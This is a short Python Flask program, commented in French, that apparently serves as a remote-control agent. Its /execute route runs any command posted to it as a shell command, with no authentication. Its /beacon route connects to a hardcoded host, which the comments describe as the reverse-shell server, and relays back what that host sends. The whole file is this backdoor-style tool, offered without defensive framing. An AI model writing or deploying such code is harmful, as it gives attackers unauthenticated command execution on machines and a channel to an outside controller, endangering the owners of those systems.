from flask import Flask, request, jsonify, render_template
import subprocess
import os
import threading
import socket

app = Flask(__name__)
PORT = 3000
SERVER_IP = "192.168.1.100"  # Adresse IP pour le reverse shell
SERVER_PORT = 9999          # Port pour la communication du reverse shell

# Liste pour stocker l'historique des commandes
command_history = []

# Classe CommandEvent pour gérer les événements de commande
class CommandEvent:
    def __init__(self):
        self.subscribers = []

    def subscribe(self, callback):
        self.subscribers.append(callback)

    def emit(self, command):
        for callback in self.subscribers:
            callback(command)

command_event = CommandEvent()

# Route POST pour exécuter des commandes shell
@app.route('/execute', methods=['POST'])
def execute_command():
    data = request.get_json()
        
    if not data or "command" not in data:
        return jsonify({"error": "Aucune commande fournie."}), 400

    command = data["command"]

    # Ajout de la commande à l'historique
    command_history.append(command)

    # Émission de l'événement pour la commande
    threading.Thread(target=command_event.emit, args=(command,)).start()

    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True, cwd=os.getcwd())
        return jsonify({"output": result.stdout})
    except subprocess.CalledProcessError as e:
        return jsonify({"error": e.stderr}), 500

# Route pour récupérer l'état de la communication (beacon)
@app.route('/beacon', methods=['GET'])
def beacon():
    # Implémentation de la demande pour vérifier si des actions doivent être exécutées
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        s.sendall(b"BEACON")
        data = s.recv(1024)
        return jsonify({"message": data.decode()})

# Route pour afficher l'historique des commandes exécutées
@app.route('/history', methods=['GET'])
def history():
    return render_template('history.html', command_history=command_history)

# Listener pour log des commandes exécutées
def log_command(command):
    print(f"Commande reçue : {command}")

command_event.subscribe(log_command)

# Lancer le serveur Flask
if __name__ == '__main__':
    print(f"Serveur en écoute sur http://localhost:{PORT}")
    app.run(debug=True, port=PORT)
